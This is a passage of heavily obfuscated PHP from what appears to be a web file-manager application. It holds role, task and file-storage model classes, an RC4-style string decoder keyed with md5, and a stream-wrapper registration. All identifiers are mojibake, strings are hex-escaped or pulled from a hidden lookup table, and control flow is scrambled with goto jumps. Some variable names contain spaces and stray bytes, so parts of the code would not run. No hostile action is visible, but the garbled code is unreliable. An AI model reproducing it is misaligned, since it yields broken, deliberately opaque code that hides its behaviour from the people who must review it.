0) . substr(md5($EËéˆÏÁ² . $FôÎÄ§ØŸÇ), 0, 16) . $EËéˆÏÁ²; $DßÀá«‹í = strlen($EËéˆÏÁ²); $E‚àƒ«‰ç = array(); goto Fˆ¦Ÿáô×; B–Ïç¡æ: } public static function decode($E‡Â©­½–, $fÀÖâƒ–ƒ© = '') { goto Eƒ§½Í®•; E°ëãÔÙá‚: for ($F‘Ø²Œ¯ í = 0; $F‘Ø²Œ¯ í <= 255; $F‘Ø²Œ¯ í++) { $D‰ğÜ½±‘[$F‘Ø²Œ¯ í] = ord($E‹„Îªñô—[$F‘Ø²Œ¯ í % $a¸Œ‹©–Ëó]); } $aŞåù®ÅŞ = range(0, 255); for ($C®±ÎåŒ = $F‘Ø²Œ¯ í = 0; $F‘Ø²Œ¯ í < 256; $F‘Ø²Œ¯ í++) { $C®±ÎåŒ = ($C®±ÎåŒ + $aŞåù®ÅŞ[$F‘Ø²Œ¯ í] + $D‰ğÜ½±‘[$F‘Ø²Œ¯ í]) % 256; $e”ÓøâÄØ = $aŞåù®ÅŞ[$F‘Ø²Œ¯ í]; $aŞåù®ÅŞ[$F‘Ø²Œ¯ í] = $aŞåù®ÅŞ[$C®±ÎåŒ]; $aŞåù®ÅŞ[$C®±ÎåŒ] = $e”ÓøâÄØ; } goto DŞ ¢Á·°â; Eƒ§½Í®•: $d Ò´Œôƒ =& $_SERVER[¦·]; $E‡Â©­½– = str_replace(array($d Ò´Œôƒ[412], $d Ò´Œôƒ[70], $d Ò´Œôƒ[91]), array($d Ò´Œôƒ[284], $d Ò´Œôƒ[8], $d Ò´Œôƒ[909]), $E‡Â©­½–); $dÌñ“¤ ñ  = 4; goto a–°Ù¬®‘‘; DŞ ¢Á·°â: $BÆ¨”Ò²ˆ = $d Ò´Œôƒ[33]; for ($d´ŒÅÁ­êŸ = $C®±ÎåŒ = $F‘Ø²Œ¯ í = 0; $F‘Ø²Œ¯ í < $bĞ™è²İœ; $F‘Ø²Œ¯ í++) { $d´ŒÅÁ­êŸ = ($d´ŒÅÁ­êŸ + 1) % 256; $C®±ÎåŒ = ($C®±ÎåŒ + $aŞåù®ÅŞ[$d´ŒÅÁ­êŸ]) % 256; $e”ÓøâÄØ = $aŞåù®ÅŞ[$d´ŒÅÁ­êŸ]; $aŞåù®ÅŞ[$d´ŒÅÁ­êŸ] = $aŞåù®ÅŞ[$C®±ÎåŒ]; $aŞåù®ÅŞ[$C®±ÎåŒ] = $e”ÓøâÄØ; $BÆ¨”Ò²ˆ .= chr(ord($E‡Â©­½–[$F‘Ø²Œ¯ í]) ^ $aŞåù®ÅŞ[($aŞåù®ÅŞ[$d´ŒÅÁ­êŸ] + $aŞåù®ÅŞ[$C®±ÎåŒ]) % 256]); } $fÅ†™…ŠÕ = intval(substr($BÆ¨”Ò²ˆ, 0, 10)); goto b·ß¶³•éœ; b·ß¶³•éœ: if (($fÅ†™…ŠÕ == 0 || $fÅ†™…ŠÕ - time() > 0) && substr($BÆ¨”Ò²ˆ, 10, 16) == substr(md5(substr($BÆ¨”Ò²ˆ, 26) . $cÜöŒ¿Š¯), 0, 16)) { return substr($BÆ¨”Ò²ˆ, 26); } else { return $d Ò´Œôƒ[33]; } goto a›­—ä–ø; b–½›ÓÕæ: $E‡Â©­½– = base64_decode(substr($E‡Â©­½–, $dÌñ“¤ ñ )); $bĞ™è²İœ = strlen($E‡Â©­½–); $D‰ğÜ½±‘ = array(); goto E°ëãÔÙá‚; a–°Ù¬®‘‘: $fÀÖâƒ–ƒ© = md5($fÀÖâƒ–ƒ© ? $fÀÖâƒ–ƒ© : self::$defaultKey); $AáŞËÎ¦Ìœ = md5(substr($fÀÖâƒ–ƒ©, 0, 16)); $cÜöŒ¿Š¯ = md5(substr($fÀÖâƒ–ƒ©, 16, 16)); goto c¼¹¼¨³; c¼¹¼¨³: $fæ©òíÜî = substr($E‡Â©­½–, 0, $dÌñ“¤ ñ ); $E‹„Îªñô— = $AáŞËÎ¦Ìœ . md5($AáŞËÎ¦Ìœ . $fæ©òíÜî); $a¸Œ‹©–Ëó = strlen($E‹„Îªñô—); goto b–½›ÓÕæ; a›­—ä–ø: } } define($_SERVER[¦·][1939], 1); goto D±•ˆËØÁŸ; Eğ¥Àß”ëä: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\162\x6f\x6c\x65\x4c\x69\163\164"; public $field = array("\156\141\155\145", "\141\x75\164\x68", "\x6c\x61\142\145\154", "\x64\x69\x73\x70\x6c\x61\x79", "\163\171\163\164\x65\x6d", "\144\145\x73\143", "\151\147\x6e\157\x72\x65\x45\x78\164", "\151\147\x6e\157\162\145\x46\151\154\145\123\x69\172\x65", "\141\144\x6d\151\x6e\x69\163\164\x72\x61\164\x6f\162", "\x73\x6f\162\164"); public function listData($A˜¹ğ“Ø = false, $A‘…Õº˜ = "\x73\x6f\162\x74", $B¿Ù¹‰ó = false) { $fçŒ¾¥×œ‘ =& $_SERVER[¦·]; $f¯Æ¸í·• = parent::listData($A˜¹ğ“Ø, $A‘…Õº˜, $B¿Ù¹‰ó); if (!$A˜¹ğ“Ø) { $Fë·‹È“÷¹ = $fçŒ¾¥×œ‘[2518]; foreach ($f¯Æ¸í·• as $E“ëÛ¨µÛ => $d­¶Ûä§‚) { if ($d­¶Ûä§‚[$fçŒ¾¥×œ‘[2298]] == 1) { $f¯Æ¸í·•[$E“ëÛ¨µÛ][$fçŒ¾¥×œ‘[405]] = $Fë·‹È“÷¹; } } } return $f¯Æ¸í·•; } public function update($d‰âê‘‘Î², $A« »ø”‰) { goto DßÑã°¤¾‰; DßÑã°¤¾‰: $DÕèã¢ª× =& $_SERVER[¦·]; $dÃ¡ø¦Œ¡ = parent::listData($d‰âê‘‘Î²); $FˆÅ¿–¢Ä— = $this->findByName($A« »ø”‰[$DÕèã¢ª×[28]]); goto EìÑ—›ÈÈ; EìÑ—›ÈÈ: if (!$dÃ¡ø¦Œ¡ || $FˆÅ¿–¢Ä— && $FˆÅ¿–¢Ä—[$DÕèã¢ª×[367]] != $dÃ¡ø¦Œ¡[$DÕèã¢ª×[367]]) { return !1; } if ($FˆÅ¿–¢Ä—[$DÕèã¢ª×[2298]] == 1) { $A« »ø”‰ = array($DÕèã¢ª×[28] => $A« »ø”‰[$DÕèã¢ª×[28]], $DÕèã¢ª×[2131] => $A« »ø”‰[$DÕèã¢ª×[2131]]); } $this->filterAuth($A« »ø”‰[$DÕèã¢ª×[376]]); goto a˜º›Íá’º; a˜º›Íá’º: return parent::update($d‰âê‘‘Î², $A« »ø”‰); goto dÜ¹¹êÙ¼; dÜ¹¹êÙ¼: } public function remove($Fäå–¢ƒ¶£) { $e„¹Ø˜å³ = parent::listData($Fäå–¢ƒ¶£); if (!$e„¹Ø˜å³ || $e„¹Ø˜å³[$_SERVER[¦·][1083]]) { return !1; } return parent::remove($Fäå–¢ƒ¶£); } public function add($D‡Œ‰‹Ø”) { goto Bæï‘§¤±½; b·ËÊËÂ›©: $D”ªˆ“Ÿƒ = array($fƒ³ ¤‚œ[386] => $cŠ°ˆê×æ, $fƒ³ ¤‚œ[2118] => $fƒ³ ¤‚œ[33], $fƒ³ ¤‚œ[2114] => $fƒ³ ¤‚œ[2132], $fƒ³ ¤‚œ[2519] => 1, $fƒ³ ¤‚œ[2117] => 0, $fƒ³ ¤‚œ[2520] => 0, $fƒ³ ¤‚œ[2116] => $this->getSort()); $D‡Œ‰‹Ø” = array_merge($D”ªˆ“Ÿƒ, $D‡Œ‰‹Ø”); $this->filterAuth($D‡Œ‰‹Ø”[$fƒ³ ¤‚œ[376]]); goto aàµ×¼¼ÙÀ; Bæï‘§¤±½: $fƒ³ ¤‚œ =& $_SERVER[¦·]; $cŠ°ˆê×æ = $D‡Œ‰‹Ø”[$fƒ³ ¤‚œ[28]]; if ($this->findByName($cŠ°ˆê×æ)) { return !1; } goto b·ËÊËÂ›©; aàµ×¼¼ÙÀ: return parent::insert($D‡Œ‰‹Ø”); goto Dõ¼Ğ¿¿‹; Dõ¼Ğ¿¿‹: } private function getSort() { $aŞõ¶ìªœÄ =& $_SERVER[¦·]; $F‡œÎ†ì·Ã = parent::listData(); $e¥¢ê¼îóÕ = array_to_keyvalue($F‡œÎ†ì·Ã, $aŞõ¶ìªœÄ[33], $aŞõ¶ìªœÄ[2134]); return empty($e¥¢ê¼îóÕ) ? 0 : max($e¥¢ê¼îóÕ) + 1; } private function filterAuth(&$Dº‹§¯’ù) { $dÀ…¿ÆŒ =& $_SERVER[¦·]; $C´ÃÓÕµéÀ = array(); $dÇÙêá¹Ğù = array_filter(explode($dÀ…¿ÆŒ[47], $Dº‹§¯’ù)); foreach ($dÇÙêá¹Ğù as $Dº‹§¯’ù) { $e¹Ë¥ä¬Éª = explode($dÀ…¿ÆŒ[91], $Dº‹§¯’ù); if ($e¹Ë¥ä¬Éª[0] == $dÀ…¿ÆŒ[1789] && $e¹Ë¥ä¬Éª[1] != $dÀ…¿ÆŒ[1039]) { $fãš³´ µ… = $e¹Ë¥ä¬Éª[0] . $dÀ…¿ÆŒ[91] . $e¹Ë¥ä¬Éª[1] . $dÀ…¿ÆŒ[2521]; if (!in_array($fãš³´ µ…, $dÇÙêá¹Ğù)) { $C´ÃÓÕµéÀ[] = $fãš³´ µ…; } } $C´ÃÓÕµéÀ[] = $Dº‹§¯’ù; } $Dº‹§¯’ù = implode($dÀ…¿ÆŒ[47], $C´ÃÓÕµéÀ); } public function sort($A‡ƒÎÛ”•, $C‘èîåàµê) { return parent::update($A‡ƒÎÛ”•, $C‘èîåàµê); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\164\x61\x73\x6b\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\145", "\164\x79\160\x65", "\x65\x76\145\156\x74", "\x74\x69\x6d\x65", "\x64\145\163\143", "\163\x79\x73\164\x65\x6d", "\x65\156\141\142\x6c\x65", "\x6c\141\x73\164\122\x75\x6e", "\163\157\x72\x74"); public function listData($FëËÌ™¢™ = false, $EÔØóå÷Î² = "\163\x6f\x72\x74", $B ¶µè±Ø¡ = false) { return parent::listData($FëËÌ™¢™, $EÔØóå÷Î², $B ¶µè±Ø¡); } public function add($eâîˆ‘È¶É) { $c·ãÇ¡Èëá =& $_SERVER[¦·]; $DâÖóªµ÷ = $this->findByName($eâîˆ‘È¶É[$c·ãÇ¡Èëá[28]]); if ($DâÖóªµ÷) { return !1; } $eâîˆ‘È¶É[$c·ãÇ¡Èëá[1406]] = 0; $eâîˆ‘È¶É[$c·ãÇ¡Èëá[2134]] = $this->getSort(); return parent::insert($eâîˆ‘È¶É); } private function getSort() { $F¶õ™†·â =& $_SERVER[¦·]; $D´°¹ÕÙë = parent::listData(); $dÌá±‡¨‡ = array_to_keyvalue($D´°¹ÕÙë, $F¶õ™†·â[33], $F¶õ™†·â[2134]); return empty($dÌá±‡¨‡) ? 0 : max($dÌá±‡¨‡) + 1; } public function update($e†‰öë­¼İ, $dàÍŸùÎ°Ø) { $Cê¢åùåâ =& $_SERVER[¦·]; $FÛ‹¦àÓ = $this->listData($e†‰öë­¼İ); $eì½å¬ä‹º = $this->findByName($dàÍŸùÎ°Ø[$Cê¢åùåâ[28]]); if (!$FÛ‹¦àÓ || $eì½å¬ä‹º && $eì½å¬ä‹º[$Cê¢åùåâ[367]] != $FÛ‹¦àÓ[$Cê¢åùåâ[367]]) { return !1; } return parent::update($e†‰öë­¼İ, $dàÍŸùÎ°Ø); } public function remove($dç›øŸÏåÓ, $eçá×Œ¼È = false) { $f†º£ŠƒÉ‹ =& $_SERVER[¦·]; $C‡¼ÎÀØ‰° = $this->listData($dç›øŸÏåÓ); if (!$C‡¼ÎÀØ‰°) { return; } if (!$eçá×Œ¼È && $C‡¼ÎÀØ‰°[$f†º£ŠƒÉ‹[1083]] == $f†º£ŠƒÉ‹[83]) { return !1; } return parent::remove($dç›øŸÏåÓ); } public function enable($fßã¤Ñ–·Û, $B¿»Àøâ½) { return $this->update($fßã¤Ñ–·Û, array($_SERVER[¦·][2512] => $B¿»Àøâ½)); } public function run($fº¶Œ«¢’) { return $this->update($fº¶Œ«¢’, array($_SERVER[¦·][2522] => time())); } } goto e¢ÆÃŒŠáÉ; d¨’Ç¾œİ: $_SERVER[$_SERVER[æªÊ«][49]] = (base64_decode('OTkyNw==')."\x31\x33")+0;$_jmI4="Q6sCpy6I8MZCaTvXheK2ik4JNkt7bwgxmN8wFdjiZA4HscC39JTyBPixXwnjeS4WruG9D";; stream_wrapper_register($_SERVER[æªÊ«][50], $_SERVER[æªÊ«][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($b–ßß²¸ŠÏ, $dã´ò¼Š) { $BÈ‡î°¼Ù› =& $_SERVER[¦·]; if (isset(self::$_methodList[$b–ßß²¸ŠÏ])) { return @call_user_func_array(self::$_methodList[$b–ßß²¸ŠÏ], $dã´ò¼Š); } else { if (method_exists($this, $b–ßß²¸ŠÏ)) { return call_user_func_array(array($this, $b–ßß²¸ŠÏ), $dã´ò¼Š); } else { think_exception(__CLASS__ . $BÈ‡î°¼Ù›[4] . $b–ßß²¸ŠÏ . $BÈ‡î°¼Ù›[5]); } } } public static function __callStatic($C ²¦´¬µĞ, $aíß¼“Â¦Ù) { if (isset(self::$_methodListStatic[$C ²¦´¬µĞ])) { return call_user_func_array(self::$_methodListStatic[$C ²¦´¬µĞ], $aíß¼“Â¦Ù); } else { if (method_exists(self, $C ²¦´¬µĞ)) { return call_user_func_array(array(self, $C ²¦´¬µĞ), $aíß¼“Â¦Ù); } else { show_json("{$C ²¦´¬µĞ}\50\x29\x20\156\157\164\x20\145\x78\151\x73\164\x3b", !1); } } } public static function addMethod($c¹”Ğ±ƒ§, $E‡×ºŸğ†) { self::$_methodList[$c¹”Ğ±ƒ§] = $E‡×ºŸğ†; } public static function addMethodStatic($Aê¯šñâŒ, $D¬ªôåå»Ë) { self::$_methodListStatic[$Aê¯šñâŒ] = $D¬ªôåå»Ë; } } goto B¶‘ë‹ÖÊÎ; E¤æäËÒğì: class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\154\145"; protected $tableMeta = array("\164\141\142\x6c\145\116\x61\155\x65" => "\151\157\137\x66\x69\x6c\x65\137\155\x65\164\x61", "\x6d\x65\164\141\106\151\x65\154\144" => "\146\151\x6c\x65\x49\x44"); public function fileInfo($C÷ÂÜ‰… œ) { $aƒÚ—¡í‹£ =& $_SERVER[¦·]; static $cçÜÃ™´„ = array(); if (!isset($cçÜÃ™´„[$C÷ÂÜ‰… œ])) { $C—Ëòø Üñ = $aƒÚ—¡í‹£[2154]; $cåª¡‰¯·Î = Model($aƒÚ—¡í‹£[422])->field($C—Ëòø Üñ)->where(array($aƒÚ—¡í‹£[420] => $C÷ÂÜ‰… œ))->find(); $cçÜÃ™´„[$C÷ÂÜ‰… œ] = $cåª¡‰¯·Î; } return $cçÜÃ™´„[$C÷ÂÜ‰… œ]; } public function addFileByContent($FØŸ±†ºáÏ = '', $DÊèÂ­»½· = '') { goto B˜›£²·Œ™; eÛ‹î†§: $AÚ×–Œ‘ì  = $fÌğÄĞ›êô . $F¾Ÿí²‚ÄŒ[2156] . rand_string(16); file_put_contents($AÚ×–Œ‘ì , $FØŸ±†ºáÏ); $CÎÜ÷Ä½Ìö = $this->addFile($AÚ×–Œ‘ì , $DÊèÂ­»½·, !0); goto C›Úé²Â Û; C›Úé²Â Û: if (file_exists($AÚ×–Œ‘ì )) { @unlink($AÚ×–Œ‘ì ); } return $CÎÜ÷Ä½Ìö; goto AºøŠà¥Í; B˜›£²·Œ™: $F¾Ÿí²‚ÄŒ =& $_SERVER[¦·]; $fÌğÄĞ›êô = TEMP_PATH . $F¾Ÿí²‚ÄŒ[2155]; if (!is_dir($fÌğÄĞ›êô)) { mk_dir($fÌğÄĞ›êô); } goto eÛ‹î†§; AºøŠà¥Í: } public function createFileName($ašÈİ÷ôÖÅ) { goto c‹È§à‚‡å; b‡¿Ø‡²‚ò: $FÑóä£Õô = $aõö˜‰¹ñ±->pathFather($AèºÒ˜êİ); static $E·šÌó¶ï¼ = false; $F‰ÕÔã–“¯ = $e´æ¨Ãæ²Œ[2157] . md5($FÑóä£Õô); goto BÙÃœ¹à´³; BÙÃœ¹à´³: if (!$E·šÌó¶ï¼ && !Cache::get($F‰ÕÔã–“¯)) { $E·šÌó¶ï¼ = !0; $bÒÙ‘•ÏŸË = IO::mkdir($FÑóä£Õô); if (!IO::exist($bÒÙ‘•ÏŸË . $e´æ¨Ãæ²Œ[2158])) { IO::mkfile($bÒÙ‘•ÏŸË . $e´æ¨Ãæ²Œ[2158]); } Cache::set($F‰ÕÔã–“¯, 1, 3600 * 2); } return $AèºÒ˜êİ; goto FíÌä„ä¡‘; c‹È§à‚‡å: $e´æ¨Ãæ²Œ =& $_SERVER[¦·]; $aõö˜‰¹ñ± = IO::init($e´æ¨Ãæ²Œ[8]); $AèºÒ˜êİ = $this->makeFilePath($ašÈİ÷ôÖÅ, $aõö˜‰¹ñ±); goto b‡¿Ø‡²‚ò; FíÌä„ä¡‘: } public function makeFilePath($C”ÓÕªŒš±, $F÷ÁËó§) { goto BŒÆµ©¥£’; aáä‡ÖŸ‰—: $CŸŞÃƒš¬Õ = $E­ê£¢ïñ . rand_string(5) . short_id(100); $C”ÓÕªŒš± = str_replace($e›Ë–‰ÜÎÖ[8], $e›Ë–‰ÜÎÖ[70], KodIO::clear($C”ÓÕªŒš±)); if (!$C”ÓÕªŒš±) { $e©©ÖÇàâ = $e›Ë–‰ÜÎÖ[2161]; } goto b—ó£¥²Ãƒ; b—ó£¥²Ãƒ: switch ($e©©ÖÇàâ) { case $e›Ë–‰ÜÎÖ[2162]: $CŸŞÃƒš¬Õ = $CŸŞÃƒš¬Õ . $e›Ë–‰ÜÎÖ[91] . $F÷ÁËó§->ext($C”ÓÕªŒš±); if ($F÷ÁËó§->ext($C”ÓÕªŒš±) == $e›Ë–‰ÜÎÖ[2102]) { $CŸŞÃƒš¬Õ .= $e›Ë–‰ÜÎÖ[1343]; } break; case $e›Ë–‰ÜÎÖ[2163]: goto Cã°âÉ ‹; Cã°âÉ ‹: $BĞÎÂ³¦·‰ = Model($e›Ë–‰ÜÎÖ[1091])->get($e›Ë–‰ÜÎÖ[1339]); $D¸À„Òö” = substr(md5($e›Ë–‰ÜÎÖ[1921] . $BĞÎÂ³¦·‰ . date($e›Ë–‰ÜÎÖ[688])), 0, 8); $a¿Ã·ŠÈâ“ = KodIO::defaultDriver(); goto c„¨á‘ªÅÅ; A»Æ¸æÁô’: CacheLock::lock($CáÀëÆÓŞÀ); $FÇƒ…ŸèŒ£ = IO::fileNameAuto($E­ê£¢ïñ, $C”ÓÕªŒš±); $CŸŞÃƒš¬Õ = $E­ê£¢ïñ . $FÇƒ…ŸèŒ£; goto Aà¼Ô³”Ú; c„¨á‘ªÅÅ: $E­ê£¢ïñ = $e›Ë–‰ÜÎÖ[2164] . $a¿Ã·ŠÈâ“[$e›Ë–‰ÜÎÖ[367]] . $e›Ë–‰ÜÎÖ[2165] . date($e›Ë–‰ÜÎÖ[2166]) . $D¸À„Òö” . $e›Ë–‰ÜÎÖ[8]; if ($F÷ÁËó§->ext($C”ÓÕªŒš±) == $e›Ë–‰ÜÎÖ[2102]) { $C”ÓÕªŒš± .= $e›Ë–‰ÜÎÖ[1343]; } $CáÀëÆÓŞÀ = $e›Ë–‰ÜÎÖ[2167] . $E­ê£¢ïñ . $C”ÓÕªŒš±; goto A»Æ¸æÁô’; Aà¼Ô³”Ú: if (IO::isTypeObject($CŸŞÃƒš¬Õ) && !IO::isUploadServer($CŸŞÃƒš¬Õ)) { IO::setContent($CŸŞÃƒš¬Õ, $e›Ë–‰ÜÎÖ[33]); } CacheLock::unlock($CáÀëÆÓŞÀ); break; goto B†Áœ©‡×; B†Áœ©‡×: case $e›Ë–‰ÜÎÖ[2161]: break; default: break; } return $CŸŞÃƒš¬Õ; goto D…½¯«†ÌÛ; BŒÆµ©¥£’: $e›Ë–‰ÜÎÖ =& $_SERVER[¦·]; $e©©ÖÇàâ = Model($e›Ë–‰ÜÎÖ[1091])->get($e›Ë–‰ÜÎÖ[2159]); $E­ê£¢ïñ = KodIO::defaultIO() . date($e›Ë–‰ÜÎÖ[2160]); goto aáä‡ÖŸ‰—; D…½¯«†ÌÛ: } public function addFileByRemote($dÏ¢ëÌ²àì, $c’Œæ¾Á™, $f‚ë¾¶»Ç = array()) { goto f”‹ÅïÇà; f”‹ÅïÇà: $dæÙ”Óİ« =& $_SERVER[¦·]; if (!IO::exist($dÏ¢ëÌ²àì)) { return !1; } $B®®è¿‚ = $f‚ë¾¶»Ç[$dæÙ”Óİ«[163]] ? $f‚ë¾¶»Ç[$dæÙ”Óİ«[163]] : $dæÙ”Óİ«[33]; goto E»Ô°¯ÒŠ†; E»Ô°¯ÒŠ†: $f“«Ù÷Ó†Ş = IO::hashMd5($dÏ¢ëÌ²àì, $B®®è¿‚); $a¨ÔŠƒí = KodIO::defaultDriver(); $B¨«õõ£Ì« = array($dæÙ”Óİ«[522] => IO::size($dÏ¢ëÌ²àì), $dæÙ”Óİ«[2168] => 1, $dæÙ”Óİ«[386] => $c’Œæ¾Á™, $dæÙ”Óİ«[736] => $a¨ÔŠƒí[$dæÙ”Óİ«[367]], $dæÙ”Óİ«[387] => $dÏ¢ëÌ²àì, $dæÙ”Óİ«[2169] => $f‚ë¾¶»Ç[$dæÙ”Óİ«[164]] ? $f‚ë¾¶»Ç[$dæÙ”Óİ«[164]] : IO::hashSimple($dÏ¢ëÌ²àì), $dæÙ”Óİ«[2170] => $f“«Ù÷Ó†Ş ? $f“«Ù÷Ó†Ş : $B®®è¿‚); goto c‡µßíåÜ‹; c‡µßíåÜ‹: if ($eì«–Ô¤Û© = $this->addFileCheckExist($B¨«õõ£Ì«[$dæÙ”Óİ«[164]], $B¨«õõ£Ì«[$dæÙ”Óİ«[163]], $B¨«õõ£Ì«[$dæÙ”Óİ«[77]])) { return $eì«–Ô¤Û©; } return $this->addFileData($B¨«õõ£Ì«); goto D¬˜ĞŠÎà¶; D¬˜ĞŠÎà¶: } private function addFileData($EÓäë¨ìïÓ) { $A¡ï§©á =& $_SERVER[¦·]; if (!$EÓäë¨ìïÓ) { return !1; } $EÓäë¨ìïÓ[$A¡ï§©á[77]] = intval($EÓäë¨ìïÓ[$A¡ï§©á[77]]); if (!$EÓäë¨ìïÓ[$A¡ï§©á[77]] && strlen($EÓäë¨ìïÓ[$A¡ï§©á[164]]) > 32) { $EÓäë¨ìïÓ[$A¡ï§©á[77]] = intval(substr($EÓäë¨ìïÓ[$A¡ï§©á[164]], 32)); } $e’¥Õí®Î = $this->add($EÓäë¨ìïÓ); return $this->find($e’¥Õí®Î); } public function addFile($dÚ±Ô¯«‚”, $f÷ƒ¹ƒ¹´, $a”ÆŒªÄ‚Ô = false) { goto a¡ºàÈµÎ; bé“ºÍœñ: return $Bš‰Â½„‡; goto CÔÂ®óè¨‡; a¡ºàÈµÎ: $CõÊéñï  = IO::hashSimple($dÚ±Ô¯«‚”); $aë®ªºÉ´ = IO::hashMd5($dÚ±Ô¯«‚”); $AÉ“¬êŒĞÅ = IO::size($dÚ±Ô¯«‚”); goto a‰Âƒ×ãÕÖ; E‘ÈÕÔò‘Â: $Dõë™ÔÔÖ = $this->addFileMake($dÚ±Ô¯«‚”, $AÉ“¬êŒĞÅ, $CõÊéñï , $aë®ªºÉ´, $f÷ƒ¹ƒ¹´, $a”ÆŒªÄ‚Ô); $Bš‰Â½„‡ = $this->addFileData($Dõë™ÔÔÖ); CacheLock::unlock($D‹ËÁâÍ©); goto bé“ºÍœñ; a‰Âƒ×ãÕÖ: $D‹ËÁâÍ© = $_SERVER[¦·][2171] . $aë®ªºÉ´; CacheLock::lock($D‹ËÁâÍ©); if ($f‰­öÄğßÏ = $this->addFileCheckExist($CõÊéñï , $aë®ªºÉ´, $AÉ“¬êŒĞÅ)) { CacheLock::unlock($D‹ËÁâÍ©); return $f‰­öÄğßÏ; } goto E‘ÈÕÔò‘Â; CÔÂ®óè¨‡: } public function addFileMake($bæ§Ø´×¼ô, $fì¿ĞÂÔì¿, $BÍ£ØÍøæ, $aÓ£ä’»İ¶, $Aã™¶òÖÜ¢, $bëÖ“ÂÑºà) { goto aº†˜ª•ç; aº†˜ª•ç: $bå±„ŸŸè =& $_SERVER[¦·]; $cˆóÓé‘¤ë = $this->createFileName($Aã™¶òÖÜ¢); $BŞøÍ‡ˆ´ = get_path_father($cˆóÓé‘¤ë); goto A¯îÓ‰Â¦; aÀÜ‹´¶¶Ş: $FŒŒ‘·ÎŒ = KodIO::defaultDriver(); $aµªĞ…Ê = array($bå±„ŸŸè[522] => $fì¿ĞÂÔì¿, $bå±„ŸŸè[2168] => 1, $bå±„ŸŸè[386] => $Aã™¶òÖÜ¢, $bå±„ŸŸè[736] => $FŒŒ‘·ÎŒ[$bå±„ŸŸè[367]], $bå±„ŸŸè[387] => $cˆóÓé‘¤ë, $bå±„ŸŸè[2169] => $BÍ£ØÍøæ, $bå±„ŸŸè[2170] => $aÓ£ä’»İ¶); return $aµªĞ…Ê; goto Bí˜˜½˜¨ñ; A¯îÓ‰Â¦: $dàâÙÜÉò = get_path_this($cˆóÓé‘¤ë); if ($bëÖ“ÂÑºà) { $EŒ’ÓÖŠà = IO::move($bæ§Ø´×¼ô, $BŞøÍ‡ˆ´, !1, $dàâÙÜÉò); } else { $EŒ’ÓÖŠà = IO::copy($bæ§Ø´×¼ô, $BŞøÍ‡ˆ´, !1, $dàâÙÜÉò); } if (!$EŒ’ÓÖŠà) { return !1; } goto aÀÜ‹´¶¶Ş; Bí˜˜½˜¨ñ: } public function addFileCheckExist($FÅËš…°á±, $e¨•Ğ¦Ï”¿, $BÓÑ‘Òª´) { $cÎñĞäİ‹· =& $_SERVER[¦·]; $e³âÎªÜ“Ç = $this->findByHash($FÅËš…°á±, $e¨•Ğ¦Ï”¿); if (!$e³âÎªÜ“Ç) { return !1; } $AÀÌ¢²™ç£ = array($cÎñĞäİ‹·[2168] => intval($e³âÎªÜ“Ç[$cÎñĞäİ‹·[2172]]) + 1, $cÎñĞäİ‹·[522] => $BÓÑ‘Òª´); $this->where(array($cÎñĞäİ‹·[420] => $e³âÎªÜ“Ç[$cÎñĞäİ‹·[419]]))->save($AÀÌ¢²™ç£); return $e³âÎªÜ“Ç; } public function remove($D­×ø¥ÆÏÒ) { $this->linkCountChange($D­×ø¥ÆÏÒ, !1); $this->clearEmpty(); return !0; } public function linkAdd($fœñßÔ´áê) { $this->linkCountChange($fœñßÔ´áê, !0); } public function linkCountChange($e­…ÅÓšç‹, $f£ß“óª„¢) { goto Bì§âïÆ—; Bì§âïÆ—: $FáÎµÁî§… =& $_SERVER[¦·]; if (!$e­…ÅÓšç‹) { return; } if (!is_array($e­…ÅÓšç‹)) { $e­…ÅÓšç‹ = array($e­…ÅÓšç‹); } goto eãê…Æ‡—«; eãê…Æ‡—«: $Bï“˜Ë¼³‚ = array(); foreach ($e­…ÅÓšç‹ as $eÈ®ÃÖ¸Ø¼) { $e¨¢°§á’¡ = $eÈ®ÃÖ¸Ø¼ . $FáÎµÁî§…[33]; if (!$Bï“˜Ë¼³‚[$e¨¢°§á’¡]) { $Bï“˜Ë¼³‚[$e¨¢°§á’¡] = 0; } $Bï“˜Ë¼³‚[$e¨¢°§á’¡]++; } $eõÔöÑ“¾ = array(); goto F§¨“Ê±ÏØ; F§¨“Ê±ÏØ: foreach ($Bï“˜Ë¼³‚ as $eÈ®ÃÖ¸Ø¼ => $CŸ«Á‰œ¢’) { $e¨¢°§á’¡ = $CŸ«Á‰œ¢’ . $FáÎµÁî§…[33]; if (!$eõÔöÑ“¾[$e¨¢°§á’¡]) { $eõÔöÑ“¾[$e¨¢°§á’¡] = array(); } $eõÔöÑ“¾[$e¨¢°§á’¡][] = $eÈ®ÃÖ¸Ø¼; } foreach ($eõÔöÑ“¾ as $CŸ«Á‰œ¢’ => $cå®Ş Ñó‰) { if (!$cå®Ş Ñó‰) { continue; } $CŸ«Á‰œ¢’ = $f£ß“óª„¢ ? $CŸ«Á‰œ¢’ : -intval($CŸ«Á‰œ¢’); $A´’Ûì´ãÜ = array($FáÎµÁî§…[419] => array($FáÎµÁî§…[7], $cå®Ş Ñó‰)); if ($CŸ«Á‰œ¢’ < 0) { $A´’Ûì´ãÜ[$FáÎµÁî§…[2172]] = array($FáÎµÁî§…[931], abs($CŸ«Á‰œ¢’)); } $this->where($A´’Ûì´ãÜ)->setAdd($FáÎµÁî§…[2172], $CŸ«Á‰œ¢’); } goto AØÙÆ‚Ìæ; AØÙÆ‚Ìæ: } public function findByHash($FÕ½—ß®ñ, $E’Ãò›ˆìå = false) { $Eò©Å«Åœ± =& $_SERVER[¦·]; if (!$FÕ½—ß®ñ && !$E’Ãò›ˆìå) { return !1; } $FŸ¸Ô²Ò±° = array($Eò©Å«Åœ±[2169] => $FÕ½—ß®ñ); if ($E’Ãò›ˆìå) { $FŸ¸Ô²Ò±° = array($Eò©Å«Åœ±[2170] => $E’Ãò›ˆìå); } return $this->order($Eò©Å«Åœ±[2173])->where($FŸ¸Ô²Ò±°)->find(); } public function clearEmpty($d…¾ŒºŠëÅ = 0) { goto e‡›„´’À; c®¡„–®•: foreach ($cÄµÎŞŸß¯ as $D¶Ã…Ø™ô) { $Eİ©É„Í’->update(1); $this->resetFile($D¶Ã…Ø™ô); } $Eİ©É„Í’->end(); goto A ‘¡¼É¨³; eŒ·ªÃ³”„: $cÄµÎŞŸß¯ = 